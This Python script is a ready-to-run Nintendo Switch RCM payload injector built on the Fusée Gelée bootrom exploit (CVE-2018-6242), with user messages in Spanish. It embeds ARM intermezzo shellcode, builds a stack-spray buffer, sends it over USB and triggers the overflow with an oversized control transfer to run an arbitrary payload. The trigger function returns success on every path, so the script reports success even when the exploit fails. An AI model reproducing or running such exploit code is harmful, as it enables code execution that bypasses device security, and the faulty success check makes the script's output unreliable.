#!/usr/bin/env python3
"""
SwitchRCMInjector - Simple RCM payload injector for Nintendo Switch
Based on the Fusée Gelée exploit (CVE-2018-6242)

Usage:
    python3 inject.py                    # Uses default payload
    python3 inject.py payload.bin        # Uses specified payload
"""

import sys
import os

try:
    import usb.core
    import usb.util
except ImportError:
    print("ERROR: pyusb no esta instalado")
    print("Ejecuta: pip install pyusb")
    sys.exit(1)

VENDOR_ID = 0x0955
PRODUCT_ID = 0x7321

INTERMEZZO = bytes([
    0x5c, 0x00, 0x9f, 0xe5, 0x5c, 0x10, 0x9f, 0xe5, 0x5c, 0x20, 0x9f, 0xe5, 0x01, 0x20, 0x42, 0xe0,
    0x0e, 0x00, 0x00, 0xeb, 0x48, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1,
    0x48, 0x00, 0x9f, 0xe5, 0x48, 0x10, 0x9f, 0xe5, 0x01, 0x29, 0xa0, 0xe3, 0x07, 0x00, 0x00, 0xeb,
    0x38, 0x00, 0x9f, 0xe5, 0x01, 0x19, 0xa0, 0xe3, 0x01, 0x00, 0x80, 0xe0, 0x34, 0x10, 0x9f, 0xe5,
    0x03, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1,
    0x04, 0x30, 0x91, 0xe4, 0x04, 0x30, 0x80, 0xe4, 0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a,
    0x1e, 0xff, 0x2f, 0xe1, 0x00, 0xf0, 0x00, 0x40, 0x20, 0x00, 0x01, 0x40, 0x7c, 0x00, 0x01, 0x40,
    0x00, 0x00, 0x01, 0x40, 0x40, 0x0e, 0x01, 0x40, 0x00, 0x70, 0x01, 0x40
])

STACK_SPRAY = b'\x00\x00\x01\x40'


def create_payload(payload_path):
    """Create the RCM payload with intermezzo and stack spray"""
    with open(payload_path, 'rb') as f:
        payload = f.read()

    print(f"[*] Payload size: {len(payload)} bytes")

    # Validate payload size
    if len(payload) > 0x1ed58:
        print("[-] Error: Payload demasiado grande")
        return None
    if len(payload) < 0x4000:
        print("[-] Error: Payload demasiado pequeno")
        return None

    # Build RCM payload
    rcm_payload = bytearray(0x30298)

    # Init sequence at offset 0
    rcm_payload[0:3] = bytes([0x98, 0x02, 0x03])

    # Intermezzo at offset 0x2a8
    rcm_payload[0x2a8:0x2a8 + len(INTERMEZZO)] = INTERMEZZO

    # First 0x4000 bytes of payload at offset 0x10e8
    rcm_payload[0x10e8:0x10e8 + 0x4000] = payload[:0x4000]

    # Stack spray at offset 0x50e8 (0x870 copies of 4 bytes)
    for i in range(0x870):
        offset = 0x50e8 + i * 4
        rcm_payload[offset:offset + 4] = STACK_SPRAY

    # Rest of payload at offset 0x72a8
    remaining = payload[0x4000:]
    rcm_payload[0x72a8:0x72a8 + len(remaining)] = remaining

    # Calculate final size
    total_size = 0x10e8 + len(payload) + 0x21c0
    total_size += 0x1000 - (total_size % 0x1000)
    if (total_size // 0x1000) % 2 == 0:
        total_size += 0x1000

    rcm_payload = bytes(rcm_payload[:total_size])
    print(f"[*] RCM payload size: {len(rcm_payload)} bytes")
    return rcm_payload


def find_switch():
    """Find Nintendo Switch in RCM mode"""
    return usb.core.find(idVendor=VENDOR_ID, idProduct=PRODUCT_ID)


def read_device_id(dev):
    """Read the device ID"""
    try:
        device_id = dev.read(0x81, 16, 1000)
        return ''.join([f'{b:02X}' for b in device_id])
    except Exception:
        return None


def write_payload(dev, payload):
    """Write the payload to the device in chunks"""
    chunk_size = 0x1000
    total_chunks = len(payload) // chunk_size

    for i in range(0, len(payload), chunk_size):
        chunk = payload[i:i + chunk_size]
        try:
            dev.write(0x01, chunk, 1000)
        except Exception as e:
            print(f"[-] Error escribiendo chunk {i // chunk_size}/{total_chunks}: {e}")
            return False
    return True


def smash_stack(dev):
    """Trigger the Fusée Gelée vulnerability"""
    try:
        dev.ctrl_transfer(
            bmRequestType=0x82,
            bRequest=0x00,
            wValue=0,
            wIndex=0,
            data_or_wLength=0x7000,
            timeout=1000
        )
    except usb.core.USBTimeoutError:
        return True
    except usb.core.USBError:
        return True
    return True


def main():
    # Get payload path
    if len(sys.argv) > 1:
        payload_path = sys.argv[1]
    else:
        # Look for default payloads
        default_paths = [
            "payloads/hekate.bin",
            "payloads/hekate_ctcaer.bin",
            "hekate.bin",
        ]
        payload_path = None
        for path in default_paths:
            if os.path.exists(path):
                payload_path = path
                break

        if not payload_path:
            print("Uso: python3 inject.py <payload.bin>")
            print("No se encontro payload por defecto")
            return 1

    if not os.path.exists(payload_path):
        print(f"[-] Error: No se encontro el archivo {payload_path}")
        return 1

    print(f"[*] Payload: {payload_path}")
    print("[*] Buscando Nintendo Switch en modo RCM...")

    dev = find_switch()
    if dev is None:
        print("[-] No se encontro la Switch en modo RCM")
        print("    Asegurate de que este en RCM y conectada por USB-C")
        return 1

    print("[+] Switch encontrada!")

    # Setup device
    try:
        dev.set_configuration()
    except:
        pass

    try:
        usb.util.claim_interface(dev, 0)
    except:
        pass

    # Read device ID
    device_id = read_device_id(dev)
    if device_id:
        print(f"[*] Device ID: {device_id}")

    # Create payload
    print("[*] Creando payload RCM...")
    rcm_payload = create_payload(payload_path)
    if rcm_payload is None:
        return 1

    # Send payload
    print("[*] Enviando payload...")
    if not write_payload(dev, rcm_payload):
        print("[-] Error enviando payload")
        return 1

    # Trigger exploit
    print("[*] Ejecutando exploit...")
    if smash_stack(dev):
        print("[+] EXITO! Payload inyectado")
        return 0
    else:
        print("[-] Error en exploit")
        return 1


if __name__ == "__main__":
    sys.exit(main())
